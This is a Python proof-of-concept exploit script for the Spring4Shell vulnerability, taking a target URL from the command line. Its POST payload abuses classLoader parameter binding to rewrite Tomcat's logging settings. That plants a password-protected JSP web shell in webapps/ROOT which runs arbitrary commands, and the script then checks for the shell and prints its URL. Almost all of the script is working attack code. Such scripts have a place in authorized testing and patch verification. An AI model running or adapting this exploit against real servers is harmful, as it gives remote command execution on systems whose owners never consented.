import requests
import argparse
from urllib.parse import urljoin

#Exploit Spring4Shell

def exploit(url):
    headers = {"suffix":"%><!--//",
                "c1":"Runtime",
                "c2":"<%",
                "DNT":"1",
                "Content-Type":"application/x-www-form-urlencoded"
    }
    
    data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22SheLeG%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
    
    try:
        requests.post(url,headers=headers,data=data,timeout=15,allow_redirects=False,verify=False)
        shellurl = urljoin(url, 'shell.jsp')
        shellcheck = requests.get(shellurl,timeout=15,allow_redirects=False,verify=False)
        if shellcheck.status_code == 200:
            print("\033[92m {}\033[00m" .format(f"[+] Vulnerable Machine! your shell url at: {shellurl}?pwd=SheLeG&cmd=whoami"))
        else:
            print("\033[91m {}\033[00m" .format("[-] Exploitation Failed! machine might not be vulnerable"))
    except Exception as e:
        print (e)
        pass



if __name__ =='__main__':
    print('''
   _____            _             __ __ _____ __         ____
  / ___/____  _____(_)___  ____ _/ // // ___// /_  ___  / / /
  \__ \/ __ \/ ___/ / __ \/ __ `/ // /_\__ \/ __ \/ _ \/ / / 
 ___/ / /_/ / /  / / / / / /_/ /__  __/__/ / / / /  __/ / /  
/____/ .___/_/  /_/_/ /_/\__, /  /_/ /____/_/ /_/\___/_/_/   
    /_/                 /____/                               
Spring4Shell PoC by SheL3G''')
    parser = argparse.ArgumentParser(description='Spring4Shell PoC')
    parser.add_argument('url', help='Target URL')
    args = parser.parse_args()
    exploit(args.url)
